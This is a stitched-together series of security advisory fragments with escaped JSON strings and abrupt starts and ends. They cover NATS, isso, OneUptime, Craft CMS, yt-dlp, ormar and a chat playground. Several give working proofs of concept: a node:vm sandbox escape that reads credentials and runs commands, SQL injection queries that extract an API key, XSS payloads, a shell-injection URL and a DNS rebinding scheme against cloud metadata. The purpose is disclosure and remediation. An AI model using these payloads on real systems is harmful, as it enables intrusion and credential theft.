The implementation bound the memory size of a NATS message but did not independently bound the memory consumption of the memory stream when constructing a NATS message which might then fail validation for size reasons.\n\nAn attacker can use a compression bomb to cause excessive memory consumption, often resulting in the operating system terminating the server process.\n\nThe use of compression is negotiated before authentication, so this does not require valid NATS credentials to exploit.\n\nThe fix was to bounds the decompression to fail once the message was too large, instead of continuing on.\n\n### Patches\n\nThis was released in nats-server without being highlighted as a security issue.  It should have been, this was an oversight.  Per the NATS security policy, because this does not require a valid user, it is CVE-worthy.\n\nThis was fixed in the v2.11 series with v2.11.12 and in the v2.12 series with v2.12.3.\n\n### Workarounds\n\nThis only affects deployments which use WebSockets and which expose the network port to untrusted end-points.\n\n### References\n\nThis was reported to the NATS maintainers by Pavel Kohout of Aisle Research (www.aisle.com).",

The website field was HTML-escaped using quote=False, which left single and double quotes unescaped. Since the frontend inserts the website value directly into a single-quoted href attribute via string concatenation, a single quote in the URL breaks out of the attribute context, allowing injection of arbitrary event handlers (e.g. onmouseover, onclick).\n\nThe same escaping was missing entirely from the user-facing comment edit endpoint (PUT /id/<id>) and the moderation edit endpoint (POST /id/<id>/edit/<key>).\n\nAny visitor to a page embedding isso comments is impacted. No authentication or interaction beyond mouse movement is required to trigger a payload — an attacker can post a comment anonymously (moderation is off by default) with a crafted website URL, and the payload persists in the database and fires on every page load. With the full-page invisible overlay technique described in the report, the victim only needs to move their mouse.\n\n## Patches\n\nThe issue is fixed in commit 3cf27c2. Users should upgrade to a version containing that commit once released. The fix applies html.escape(..., quote=True) to the website field across all three write paths (POST /new, PUT /id/<id>, POST /id/<id>/edit/<key>), and adds input validation and escaping to the moderation edit endpoint which previously had neither.\n\n## Workarounds\n\n  Enabling comment moderation (moderation = enabled = true in isso.cfg) prevents unauthenticated users from publishing comments, raising the bar for exploitation. However, it\n  does not fully mitigate the issue since a moderator activating a malicious comment would still expose visitors. There is no configuration-only workaround that fully prevents\n   the vulnerability.\n\n## Resources\n\n  - https://docs.python.org/3/library/html.html#html.escape — note the quote parameter",

          "html": "### Summary\n\nOneUptime lets project members write custom JavaScript that runs inside monitors. The problem is it executes that code using Node.js's built-in `vm` module, which Node.js itself documents as \"not a security mechanism — do not use it to run untrusted code.\" The classic one-liner escape gives full access to the underlying process, and since the probe runs with host networking and holds all cluster credentials in its environment, this turns into a full cluster compromise for anyone who can register an account.\n\n### Details\n\nThe vulnerable code is in `Common/Server/Utils/VM/VMRunner.ts` at line 55:\n\n```typescript\nvm.runInContext(script, sandbox, { timeout })\n```\n\nThe JavaScript that reaches this call comes straight from the monitor's `customCode` field, which is only validated as `Zod.string().optional()` in `Common/Types/Monitor/MonitorStep.ts:531`. No AST analysis, no keyword filtering, nothing — just a string that goes directly into `vm.runInContext()`.\n\nBoth `CustomCodeMonitor.ts` and `SyntheticMonitor.ts` import `VMRunner` directly inside the probe process. So when the probe picks up a monitor and runs it, the escape executes in the probe's own process — not a child process, not a container.\n\nTwo things make this especially bad:\n\nFirst, the probe runs with `network_mode: host` (see `docker-compose.base.yml:397`) and carries `ONEUPTIME_SECRET`, `DATABASE_PASSWORD`, `REDIS_PASSWORD`, and `CLICKHOUSE_PASSWORD` as environment variables. Once you escape the sandbox you have all of those.\n\nSecond, the permission to create monitors is granted to `Permission.ProjectMember` — the lowest role — in `Common/Models/DatabaseModels/Monitor.ts:46-51`. There is no check that restricts Custom JavaScript Code monitors to admins only. And since open registration is on by default (`disableSignup: false`), any random person on the internet can reach this in about 30 seconds.\n\nOne more thing worth flagging: the `IsolatedVM` microservice is also affected despite its name. `IsolatedVM/API/VM.ts:41` calls the exact same `VMRunner.runCodeInSandbox()` — it does NOT use the `isolated-vm` npm package. Workflow components and monitor criteria expressions both route through it and are equally exploitable.\n\n### PoC\n\n1. Register at `/accounts/register` — signup is open by default, no invite needed\n2. Create a project — you get ProjectMember automatically\n3. Go to Monitors → Add Monitor → pick **Custom JavaScript Code**\n4. Paste this into the code field:\n\n```javascript\nconst proc = this.constructor.constructor('return process')();\nconst run = proc.mainModule.require('child_process').execSync;\nreturn {\n  data: {\n    secret:     proc.env.ONEUPTIME_SECRET,\n    db_pass:    proc.env.DATABASE_PASSWORD,\n    redis_pass: proc.env.REDIS_PASSWORD,\n    id:         run('id').toString().trim(),\n    hostname:   run('hostname').toString().trim()\n  }\n};\n```\n\n5. Save the monitor and wait about 60 seconds for the probe to poll\n6. Open Monitor Logs — the result contains the cluster secret, database password, and the output of `id` running on the probe host\n\nThat's it. No admin account, no special config, no extra steps.\n\n### Impact\n\nThis is a code injection vulnerability affecting any OneUptime deployment with open registration or any trusted user with ProjectMember access. The attacker gets arbitrary command execution on the probe host, all cluster credentials from the environment, and with host networking can directly connect to PostgreSQL, Redis, and ClickHouse using those credentials. One monitor creation → full cluster compromise.\n\nThe straightforward fix is to replace `node:vm` with the `isolated-vm` npm package, which provides real V8 isolate sandboxing and is the standard solution for this exact problem in the Node.js ecosystem.",

Attacker uses credentials to access AWS services\n6. **Attacker can now achieve code execution by creating new EC2 instances with their SSH key**\n\n---\n\n## Remediation\n\nReplace `gethostbyname()` with `dns_get_record()` to check both IPv4 and IPv6:\n\n```php\n// Resolve both IPv4 and IPv6 addresses\n$records = @dns_get_record($hostname, DNS_A | DNS_AAAA);\nif ($records === false) {\n    $records = [];\n}\n\n// Blocked IPv6 metadata prefixes\n$blockedIPv6Prefixes = [\n    'fd00:ec2::',       // AWS IMDS, DNS, NTP\n    'fd20:ce::',        // GCP Metadata\n    '::1',              // Loopback\n    'fe80:',            // Link-local\n    '::ffff:',          // IPv4-mapped IPv6\n];\n\nforeach ($records as $record) {\n    // Check IPv4 (existing logic)\n    if (isset($record['ip']) && in_array($record['ip'], $blockedIPv4)) {\n        return false;\n    }\n\n    // Check IPv6 (NEW)\n    if (isset($record['ipv6'])) {\n        foreach ($blockedIPv6Prefixes as $prefix) {\n            if (str_starts_with($record['ipv6'], $prefix)) {\n                return false;\n            }\n        }\n    }\n}\n```\n\n### Additional Mitigations\n\n| Mitigation | Description |\n|------------|-------------|\n| Block wildcard DNS services | Block nip.io, sslip.io, xip.io suffixes |\n| Use `dns_get_record()` | Resolves both IPv4 and IPv6 |\n\n---\n\n## Resources\n\n- https://github.com/craftcms/cms/commit/2825388b4f32fb1c9bd709027a1a1fd192d709a3\n- [PHP: gethostbyname](https://www.php.net/manual/en/function.gethostbyname.php) - \"Get the **IPv4 address** corresponding to a given Internet host name\"\n- [GHSA-x27p-wfqw-hfcc](https://github.com/advisories/GHSA-x27p-wfqw-hfcc) - Original SSRF vulnerability (CVE-2025-68437)\n- [AWS IMDS IPv6 Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)\n- [GCP Metadata Server Documentation](https://cloud.google.com/compute/docs/metadata/querying-metadata)\n- [PayloadsAllTheThings - SSRF Cloud Instances](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/SSRF-Cloud-Instances.md)",

This Time-of-Check-Time-of-Use (TOCTOU) vulnerability enables DNS rebinding attacks, where an attacker’s DNS server returns different IP addresses for validation compared to the actual request.\n\nThis is a bypass of the security fix for CVE-2025-68437 ([GHSA-x27p-wfqw-hfcc](https://github.com/craftcms/cms/security/advisories/GHSA-x27p-wfqw-hfcc)) that allows access to all blocked IPs, not just IPv6 endpoints.\n\n## Severity\n\nBypass of cloud metadata SSRF protection for all blocked IPs\n\n## Required Permissions\n\nExploitation requires GraphQL schema permissions for:\n- Edit assets in the `<VolumeName>` volume\n- Create assets in the `<VolumeName>` volume\n\nThese permissions may be granted to:\n- Authenticated users with appropriate GraphQL schema access\n- Public Schema (if misconfigured with write permissions)\n\n---\n\n## Technical Details\n\n### Vulnerable Code Flow\n\nThe code at `src/gql/resolvers/mutations/Asset.php` performs two separate DNS lookups:\n\n```php\n// VALIDATION PHASE: First DNS resolution at time T1\nprivate function validateHostname(string $url): bool\n{\n    $hostname = parse_url($url, PHP_URL_HOST);\n    $ip = gethostbyname($hostname);  // DNS Lookup #1 - Returns safe IP\n\n    if (in_array($ip, [\n        '169.254.169.254',   // AWS, GCP, Azure IMDS\n        '169.254.170.2',     // AWS ECS metadata\n        '100.100.100.200',   // Alibaba Cloud\n        '192.0.0.192',       // Oracle Cloud\n    ])) {\n        return false;  // Check passes - IP looks safe\n    }\n    return true;\n}\n\n// ... time gap between validation and request ...\n\n// REQUEST PHASE: Second DNS resolution at time T2 (inside Guzzle)\n$response = $client->get($url);  // DNS Lookup #2 - Guzzle resolves DNS AGAIN\n                                  // Now returns 169.254.169.254!\n```\n\n### Root Cause\n\nTwo separate DNS lookups occur:\n1. **Validation**: `gethostbyname()` in `validateHostname()`\n2. **Request**: Guzzle's internal DNS resolution via libcurl\n\nAn attacker controlling a DNS server can return different IPs for each query.\n\n### Bypass Mechanism\n\n```\n+-----------------------------------------------------------------------------+\n| Attacker's DNS Server: evil.attacker.com                                    |\n+-----------------------------------------------------------------------------+\n| Query 1 (Validation - T1):                                                  |\n|   Request:  A record for evil.attacker.com                                  |\n|   Response: 1.2.3.4 (safe IP, TTL: 0)                                       |\n|   Result:   Validation PASSES                                               |\n+-----------------------------------------------------------------------------+\n| Query 2 (Guzzle Request - T2):                                              |\n|   Request:  A record for evil.attacker.com                                  |\n|   Response: 169.254.169.254 (metadata IP, TTL: 0)                           |\n|   Result:   Request goes to blocked IP -> CREDENTIALS STOLEN                |\n+-----------------------------------------------------------------------------+\n```\n\n---\n\n## Target Endpoints via DNS Rebinding\n\nDNS rebinding allows access to all blocked IPs:\n\n| Target | Rebind To | Impact |\n|--------|-----------|--------|\n| **AWS IMDS** | `169.254.169.254` | IAM credentials, instance identity |\n| **AWS ECS** | `169.254.170.2` | Container credentials |\n| **GCP Metadata** | `169.254.169.254` | Service account tokens |\n| **Azure Metadata** | `169.254.169.254` | Managed identity tokens |\n| **Alibaba Cloud** | `100.100.100.200` | Instance credentials |\n| **Oracle Cloud** | `192.0.0.192` | Instance metadata |\n| **Internal Services** | `127.0.0.1`, `10.x.x.x` | Internal APIs, databases |\n\n---\n\n### Attack Scenario\n\n1. Attacker sets up DNS server with alternating responses\n2. Attacker sends mutation with `url: \"http://evil.attacker.com/latest/meta-data/\"`\n3. First DNS query returns safe IP (e.g., `1.2.3.4`) → validation passes\n4. Second DNS query returns metadata IP (`169.254.169.254`) → request to metadata\n5. Attacker retrieves credentials from ANY cloud provider\n6. **Attacker can now achieve code execution by creating new instances with their SSH key**\n\n---\n\n## Remediation\n\n### Fix: DNS Pinning with CURLOPT_RESOLVE\n\nPin the DNS resolution - use the same resolved IP for both validation and request:\n\n```php\nprivate function validateHostname(string $url): bool\n{\n    $hostname = parse_url($url, PHP_URL_HOST);\n\n    // Resolve once\n    $ip = gethostbyname($hostname);\n\n    // Validate the resolved IP\n    if (in_array($ip, [\n        '169.254.169.254', '169.254.170.2',\n        '100.100.100.200', '192.0.0.192',\n    ])) {\n        return false;\n    }\n\n    // Store for later use\n    $this->pinnedDNS[$hostname] = $ip;\n\n    return true;\n}\n\n// When making the request - CRITICAL: Use pinned IP\nprotected function makeRequest(string $url): ResponseInterface\n{\n    $hostname = parse_url($url, PHP_URL_HOST);\n    $ip = $this->pinnedDNS[$hostname] ?? null;\n\n    $options = [];\n    if ($ip) {\n        // Force Guzzle/curl to use the SAME IP we validated\n        $options['curl'] = [\n            CURLOPT_RESOLVE => [\n                \"$hostname:80:$ip\",\n                \"$hostname:443:$ip\"\n            ]\n        ];\n    }\n\n    return $this->client->get($url, $options);\n}\n```\n\n### Alternative: Single Resolution with Immediate Use\n\n```php\n// Resolve to IP and use IP directly in URL\n$ip = gethostbyname($hostname);\n\nif (in_array($ip, $blockedIPs)) {\n    return false;\n}\n\n// Make request directly to IP with Host header\n$client->get(\"http://$ip\" . parse_url($url, PHP_URL_PATH), [\n    'headers' => [\n        'Host' => $hostname\n    ]\n]);\n```\n\n### Additional Mitigations\n\n| Mitigation | Description |\n|------------|-------------|\n| DNS Pinning (CURLOPT_RESOLVE) | Force same IP for validation and request |\n| Single IP-based request | Use resolved IP directly in URL |\n| Implement IMDSv2 | Requires token header (infrastructure-level) |\n| Network egress filtering | Block metadata IPs at network level |\n\n---\n\n## Resources\n\n- https://github.com/craftcms/cms/commit/a4cf3fb63bba3249cf1e2882b18a2d29e77a8575\n- [GHSA-x27p-wfqw-hfcc](https://github.com/craftcms/cms/security/advisories/GHSA-x27p-wfqw-hfcc) - Original SSRF vulnerability (CVE-2025-68437)\n- [DNSrebinder](https://github.com/mogwailabs/DNSrebinder) - Lightweight Python DNS server for testing DNS rebinding vulnerabilities; responds with legitimate IP for first N queries, then rebinds to target IP\n- [Singularity DNS Rebinding Tool](https://github.com/nccgroup/singularity)\n- [rbndr DNS Rebinding Service](https://github.com/taviso/rbndr)\n- [DNS Rebinding Attacks Explained](https://unit42.paloaltonetworks.com/dns-rebinding/)\n- [CURLOPT_RESOLVE Documentation](https://curl.se/libcurl/c/CURLOPT_RESOLVE.html)\n- OWASP SSRF Prevention Cheat Sheet",

Add a **Column Heading** and set **Column Type** to `Single-line text`\n    - **Note:** The vulnerable **Column Type** is `html`, but it's not available in the UI dropdown.\n1. In **Default Values** section, add a row with the following payload:\n    ```html\n    <img src=x onerror=\"alert('XSS')\">\n    ```\n1. Enable `Static Rows`\n1. Intercept the **Save Field** request using a proxy tool (e.g., Burp Suite) or use `cURL` directly\n1. Modify the request body and change the `types[craft-fields-Table][columns][col3][type]` parameter from `singleline` to `html`\n1. Forward the request to save the field\n1. Use the field in any object (e.g. user profile fields) → then visit the any user's profile\n1. Notice the XSS execution\n1. The XSS will also trigger when an administrator attempts to edit this field, as the malicious payload is executed within the field configuration page, too.\n\n## Resources\n\nhttps://github.com/craftcms/cms/commit/f5d488d9bb6eff7670ed2c2fe30e15692e92c52b",

Even though the maliciously crafted URL itself will look very suspicious to many users, it would be trivial for a maliciously crafted webpage with an inconspicuous URL to covertly exploit this vulnerability via HTTP redirect. Users without `--netrc-cmd` in their arguments or `netrc_cmd` in their scripts are unaffected. No evidence has been found of this exploit being used in the wild.\n\n### Patches\nyt-dlp version 2026.02.21 fixes this issue by validating all netrc \"machine\" values and raising an error upon unexpected input.\n\n### Workarounds\nIt is recommended to upgrade yt-dlp to version 2026.02.21 as soon as possible.\n\nUsers who are unable to upgrade should avoid using the `--netrc-cmd` command-line option (or `netrc_cmd` Python API parameter), or they should at least not pass a placeholder (`{}`) in their `--netrc-cmd` argument.\n\n### Details\nyt-dlp's `--netrc-cmd` option can be used to run any arbitrary shell command to retrieve site login credentials so that the user doesn't have to store the credentials as plaintext in the filesystem. The `--netrc-cmd` argument is a shell command with an optional placeholder (`{}`). If the placeholder is present in the argument, it is replaced with the netrc \"machine\" value, which specifies the site for which login credentials are needed.\n\nThe netrc \"machine\" value is usually explicitly defined in yt-dlp's extractor code for a given site. However, yt-dlp has four extractors where the netrc \"machine\" value needs to be dynamically sourced from the site's hostname. And in three of those extractors (`GetCourseRuIE`, `TeachableIE` and `TeachableCourseIE`), wildcard matches are allowed for one or more subdomains of the hostname. This can result in a netrc \"machine\" value that contains special shell characters.\n\nThe `--netrc-cmd` argument is executed by a modified version of Python's `subprocess.Popen` with `shell=True`, which means that any special characters may be interpreted by the host shell, potentially leading to arbitrary command injection.\n\nHere is an example of maliciously crafted URL input that exploits the vulnerability:\n\n```cmd\n> yt-dlp --netrc-cmd \"echo {}\" \"https://;echo pwned>&2;#.getcourse.ru/video\"\n[GetCourseRu] Executing command: echo getcourseru\nWARNING: [GetCourseRu] Failed to parse .netrc: bad toplevel token 'getcourseru' (-, line 2)\n[GetCourseRu] Extracting URL: https://;echo pwned>&2;#.getcourse.ru/video\n[GetCourseRu] Executing command: echo ;echo pwned>&2;\npwned\n[GetCourseRu] No authenticators for ;echo pwned>&2;\n[GetCourseRu] video: Downloading webpage\n```\n\nAlthough only 3 of yt-dlp's extractors are directly susceptible to this attack, yt-dlp's \"generic\" extractor will follow HTTP redirects and try to match the resulting URL with one of the dedicated extractors. This means that any URL processed by the generic extractor could ultimately lead to a maliciously crafted URL that is matched by one of the vulnerable extractors. Hypothetically, an attacker could create a website with an inconspicuous URL and legitimate-looking media content that would serve an HTTP redirect to a maliciously crafted URL when it detects a request from yt-dlp.\n\n\n### References\n- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-g3gw-q23r-pgqm\n- https://nvd.nist.gov/vuln/detail/CVE-2026-26331\n- https://github.com/yt-dlp/yt-dlp/releases/tag/2026.02.21\n- https://github.com/yt-dlp/yt-dlp/commit/1fbbe29b99dc61375bf6d786f824d9fcf6ea9c1a",

The `min()` and `max()` methods in the `QuerySet` class accept arbitrary string input as the column parameter. While `sum()` and `avg()` are partially protected by an `is_numeric` type check that rejects non-existent fields, `min()` and `max()` skip this validation entirely. As a result, an attacker-controlled string is embedded as raw SQL inside the aggregate function call. Any unauthorized user can exploit this vulnerability to read the entire database contents, including tables unrelated to the queried model, by injecting a subquery as the column parameter.\n\n## Affected versions\n\n```\n0.9.9 - 0.12.2\n0.20.0b1 - 0.22.0 (latest)\n```\n\nThe vulnerable `SelectAction.get_text_clause()` method and the `min()`/`max()` aggregate functions were introduced together in commit `ff9d412` (March 12, 2021) and first released in version **0.9.9**. The vulnerable code has never been modified since — `get_text_clause()` is identical in every subsequent version through the latest **0.21.0**.\n\nVersions prior to 0.9.9 do not contain the `min()`/`max()` aggregate feature and are not affected.\n\nThe following uses the latest ormar 0.21.0 as an example to illustrate the attack.\n\n## Vulnerability details\n\nWhen performing an aggregate query, the `QuerySet.max()` method (line 721, `queryset.py`) passes user input to `_query_aggr_function()`. This method creates a `SelectAction` object for each column name. The column string is split by `__` and the last part becomes `self.field_name` — with no validation against the model's actual fields.\n\nThe critical vulnerability is in `SelectAction.get_text_clause()` (line 41-43, `select_action.py`), which directly passes `self.field_name` into `sqlalchemy.text()`:\n\n```python\n#select_action.py line 41-43\ndef get_text_clause(self) -> sqlalchemy.sql.expression.TextClause:\n    alias = f\"{self.table_prefix}_\" if self.table_prefix else \"\"\n    return sqlalchemy.text(f\"{alias}{self.field_name}\")  # unsanitised user input!\n```\n\nThe `apply_func()` method then wraps this raw text clause inside `func.max()`, producing SQL like `max(<attacker_input>)`. Since `sqlalchemy.text()` treats its argument as literal SQL, any subquery or SQL expression injected through the column name will be executed by the database engine.\n\nThe `_query_aggr_function()` method (line 704-719, `queryset.py`) only validates field types for `sum` and `avg`, leaving `min` and `max` completely unprotected:\n\n```python\n#queryset.py line 704-719\nasync def _query_aggr_function(self, func_name: str, columns: List) -> Any:\n    func = getattr(sqlalchemy.func, func_name)\n    select_actions = [\n        SelectAction(select_str=column, model_cls=self.model) for column in columns\n    ]\n    if func_name in [\"sum\", \"avg\"]:          # <-- only sum/avg are checked!\n        if any(not x.is_numeric for x in select_actions):\n            raise QueryDefinitionError(...)\n    select_columns = [x.apply_func(func, use_label=True) for x in select_actions]\n    expr = self.build_select_expression().alias(f\"subquery_for_{func_name}\")\n    expr = sqlalchemy.select(*select_columns).select_from(expr)\n    result = await self.database.fetch_one(expr)\n    return dict(result) if len(result) > 1 else result[0]\n```\n\nTo reproduce the attack, you can follow the steps below, using a FastAPI application with SQLite as an example.\n\nNote: The PoC consists of two files provided in the attachments — `poc_server.py` (the vulnerable server) and `poc_attacker.py` (the HTTP-based attacker script).\n<h2>Start the vulnerable application</h2>\n<ol>\n<li>Install dependencies:</li>\n</ol>\n<pre><code class=\"language-bash\">pip install ormar databases aiosqlite fastapi uvicorn httpx\n</code></pre>\n<ol>\n<li>The vulnerable server (<code>poc_server.py</code>) is based on the <strong>official ormar FastAPI example</strong> (<a href=\"https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py\">ormar/examples/fastapi_quick_start.py</a>).

The attacker extracts the production API key\n\n```\nGET /items/stats?metric=max&column=(SELECT api_key FROM admin_users WHERE username='root')\n```\n\nThe API returns: `ak-9f8e7d6c5b4a3210-prod`\n\nAll data was extracted through a single public API endpoint using only unauthenticated GET requests.\n## The complete POC\n\n### poc_server.py (Vulnerable Server)\n\nBased on the official ormar FastAPI example ([[fastapi_quick_start.py](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)](https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py)):\n\n```python\n\"\"\"\nCVE PoC — Vulnerable Server\n=============================\nBased on the OFFICIAL ormar FastAPI example:\n    <https://github.com/collerek/ormar/blob/master/examples/fastapi_quick_start.py>\n\nThe only modification is the addition of a /items/stats endpoint (line 63-76),\nwhich is a common pattern for any application that provides aggregate statistics.\n\nUsage:\n    python poc_server.py\n\"\"\"\n\n# ── Original official example code (unchanged) ───────────────\n# Source: ormar/examples/fastapi_quick_start.py\n\nfrom contextlib import asynccontextmanager\nfrom typing import List, Optional\n\nimport databases\nimport ormar\nimport sqlalchemy\nimport uvicorn\nfrom fastapi import FastAPI, Query\n\nDATABASE_URL = \"sqlite:///poc_vuln.db\"\n\normar_base_config = ormar.OrmarConfig(\n    database=databases.Database(DATABASE_URL), metadata=sqlalchemy.MetaData()\n)\n\nclass Category(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"categories\")\n\n    id: int = ormar.Integer(primary_key=True)\n    name: str = ormar.String(max_length=100)\n\nclass Item(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"items\")\n\n    id: int = ormar.Integer(primary_key=True)\n    name: str = ormar.String(max_length=100)\n    price: float = ormar.Float(default=0)\n    category: Optional[Category] = ormar.ForeignKey(Category, nullable=True)\n\n# This table simulates internal data that should NOT be accessible\n# through the public API — e.g. an admin_users table in the same database.\nclass AdminUser(ormar.Model):\n    ormar_config = ormar_base_config.copy(tablename=\"admin_users\")\n\n    id: int = ormar.Integer(primary_key=True)\n    username: str = ormar.String(max_length=100)\n    password: str = ormar.String(max_length=200)\n    api_key: str = ormar.String(max_length=200)\n\n@asynccontextmanager\nasync def lifespan(app: FastAPI):\n    database_ = ormar_base_config.database\n    if not database_.is_connected:\n        await database_.connect()\n\n    # Create tables\n    engine = sqlalchemy.create_engine(DATABASE_URL)\n    ormar_base_config.metadata.create_all(engine)\n    engine.dispose()\n\n    # Seed sample data\n    if not await Item.objects.count():\n        cat = await Category.objects.create(name=\"Electronics\")\n        await Item.objects.create(name=\"Laptop\", price=999.99, category=cat)\n        await Item.objects.create(name=\"Phone\", price=699.99, category=cat)\n        await Item.objects.create(name=\"Tablet\", price=449.99, category=cat)\n        await Item.objects.create(name=\"Monitor\", price=329.99, category=cat)\n\n    if not await AdminUser.objects.count():\n        await AdminUser.objects.create(\n            username=\"root\",\n            password=\"Sup3r$ecretP@ss!\",\n            api_key=\"ak-9f8e7d6c5b4a3210-prod\",\n        )\n        await AdminUser.objects.create(\n            username=\"deploy-bot\",\n            password=\"ghp_Tx7KmR29vLp4QzN1bWcA3sYjDf80Ue5Xoi\",\n            api_key=\"ak-1a2b3c4d5e6f7890-ci\",\n        )\n\n    print(\"\\\\n  [Server] Ready.

Any API endpoint that passes user-controlled input to `Model.objects.min()` or `Model.objects.max()` becomes a full SQL injection entry point.\n\nThe attack is confirmed to work with the following database backends:\n\n- SQLite (via aiosqlite)\n- PostgreSQL (via asyncpg) — subquery syntax is identical\n- MySQL (via aiomysql) — subquery syntax is compatible\n\n**Realistic attack scenarios include:**\n\n- **REST APIs** with user-selectable aggregate fields: `GET /items/stats?column=<input>`\n- **GraphQL resolvers** that accept field names as arguments\n- **Dynamic report generators** where users select columns for aggregation\n\nThe vulnerable server in this PoC is based on the **official ormar FastAPI example**, demonstrating that the vulnerability is easily triggered through natural, documented API design patterns. The ormar documentation itself shows this exact usage pattern: `await Book.objects.max(columns=[\"year\"])` ([[ormar aggregations docs](https://collerek.github.io/ormar/queries/aggregations/)](https://collerek.github.io/ormar/queries/aggregations/)).\n\n## Display of attack results\nTerminal 1 — Start server:\n![image](https://github.com/user-attachments/assets/4c8b4a20-75da-4aba-b649-f818e46165dd)\nTerminal 2 — Run attacker:\n<img width=\"2004\" height=\"1478\" alt=\"image (1)\" src=\"https://github.com/user-attachments/assets/ae41657b-2730-4fab-ac01-e79acd267bde\" />\n<img width=\"1984\" height=\"1500\" alt=\"image (2)\" src=\"https://github.com/user-attachments/assets/cbe0d652-d4d4-458c-998b-e636d6c362a1\" />",

This can trigger malcious scripts.\n\n### PoC\n\nA simple way to exploit that is to ask the model in the playground, with prompt: \"请帮我写个脚本，跳转到google\", and then the browser will navigate to the google.com without user interference.\n\n### Impact\n\nPotential malcious activity to the user using playground, if the model api is altered to output unintended codes.\n\nAlso, users may not be easily rid the exploit, since the record of the chat containing XSS script is stored, once opening the page later, the script will be re-triggered.\n\n### Potential Workaround\n\nThe preview may be placed in an iframe sandbox, dangerous html strings should be purified before rendering.\n\n---\n\nThe reply generated for test is as below:\n\n这是一个为您编写的单页 HTML 文件。它使用了两种方式来实现跳转，以确保在任何情况下都能工作：\n\n1.  **JavaScript (`window.location.replace`)**：这是最常用且高效的方法，它会立即跳转，并且不会保留当前页面在浏览器历史记录中（这样用户按“后退”键不会回到这个跳转页）。\n2.  **HTML Meta Refresh**：作为后备方案。如果用户的浏览器禁用了 JavaScript，这个标签会在 1 秒后将用户带往 Google。\n3.  **手动链接**：页面中显示了一个备用链接，以防自动跳转被拦截或失效。\n\n您可以直接保存以下代码为 `.html` 文件并在浏览器中打开。\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>正在跳转至 Google...</title>\n    \n    <!-- 方法1：HTML Meta Refresh (如果JS被禁用，1秒后自动跳转) -->\n    <meta http-equiv=\"refresh\" content=\"1;url=https://www.google.com\">\n\n    <style>\n        /* 基础重置与布局 */\n        body, html {\n            height: 100%;\n            margin: 0;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial, sans-serif;\n            background-color: #f8f9fa;\n            color: #202124;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n        }\n\n        /* 卡片容器样式 */\n        .redirect-card {\n            background: white;\n            padding: 2rem 3rem;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            text-align: center;\n            max-width: 400px;\n            width: 90%;\n        }\n\n        /* 加载动画圆圈 */\n        .spinner {\n            border: 4px solid #f3f3f3;\n            border-top: 4px solid #4285f4; /* Google Blue */\n            border-radius: 50%;\n            width: 40px;\n            height: 40px;\n            animation: spin 1s linear infinite;\n            margin: 0 auto 1.5rem auto;\n        }\n\n        /* 文本排版 */\n        h1 {\n            font-size: 1.25rem;\n            margin-bottom: 0.5rem;\n            font-weight: 500;\n        }\n\n        p {\n            font-size: 0.95rem;\n            color: #5f6368;\n            margin-bottom: 1.5rem;\n            line-height: 1.5;\n        }\n\n        /* 手动链接样式 */\n        .manual-link {\n            display: inline-block;\n            color: #1a73e8; /* Google Link Blue */\n            text-decoration: none;\n            font-weight: 500;\n            padding: 0.5rem 1rem;\n            border: 1px solid #dadce0;\n            border-radius: 4px;\n            transition: background-color 0.2s;\n        }\n\n        .manual-link:hover {\n            background-color: #f1f3f4;\n            text-decoration: underline;\n        }\n\n        /* 动画定义 */\n        @keyframes spin {\n            0% { transform: rotate(0deg); }\n            100% { transform: rotate(360deg); }\n        }\n    </style>\n</head>\n<body>\n\n    <main class=\"redirect-card\">\n        <!-- 视觉反馈：加载动画 -->\n        <div class=\"spinner\"></div>\n        \n        <!-- 提示信息 -->\n        <h1>正在为您跳转</h1>\n        <p>我们正在将您引导至 Google。<br>如果页面没有自动刷新，请点击下方的按钮。</p>\n        \n        <!-- 手动跳转链接 -->\n        <a href=\"https://www.google.com\" class=\"manual-link\">立即前往 Google</a>\n    </main>\n\n    <script>\n        // 方法2：JavaScript 跳转 (推荐)\n        // 使用 replace() 而不是 href，这样用户点击“后退”时不会死循环回到这个跳转页\n        (function() {\n            // 目标地址\n            var targetUrl = \"https://www.google.com\";\n\n            // 执行跳转\n            window.location.replace(targetUrl);\n            \n            // 控制台日志（用于调试）\n            console.log(\"Redirecting to: \" + targetUrl);\n        })();\n    </script>\n\n</body>\n</html>\n```\n\n### Acknowledgments\n\nQuantumNous would like to thank **TechnologyStar** for the early notification of this potential vulnerability via AI-assisted tools, and **small-lovely-cat** for providing additional context and an initial patch.

ESCAPE '\\\\\\\\'\", \"%\"+keyword+\"%\").\n           Where(commonKeyCol+\" LIKE ? ESCAPE '\\\\\\\\'\", \"%\"+token+\"%\").\n           Limit(1000).\n           Find(&tokens).Error\n    return tokens, err\n}\n```\n\n### 2. Add User-Level Rate Limiting\n```go\ntokenRoute.GET(\"/search\",\n    middleware.TokenSearchRateLimit(),  // 30 req/min per user\n    controller.SearchTokens)\n```\n\n### 3. Add Query Timeout\n```go\nctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)\ndefer cancel()\nerr = DB.WithContext(ctx).Where(...).Find(&tokens).Error\n```",

